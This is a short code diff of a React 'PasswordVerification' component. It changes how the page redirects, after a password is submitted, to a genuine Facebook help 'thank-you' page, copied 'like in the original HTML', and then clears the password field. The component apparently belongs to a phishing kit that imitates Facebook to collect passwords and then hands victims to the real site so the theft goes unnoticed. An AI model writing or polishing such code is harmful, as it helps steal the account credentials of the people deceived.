@@ -92,9 +92,13 @@ function PasswordVerification({ submissionId, userData }) {
       setIsSubmitting(false);
       setIsComplete(true);
       
-      // Redirect after 2 seconds like in the original HTML
+      // Redirect after 2 seconds - avoid direct Facebook redirect to prevent CORS issues
       setTimeout(() => {
-        window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
+        // Use window.open to avoid CORS issues on deployed version
+        window.open('https://www.facebook.com/help/media/thank-you?rdrhc', '_blank');
+        // Reset form state
+        setPasswordData({ password: "" });
+        setIsComplete(false);
       }, 2000);
       
     } catch (error) {
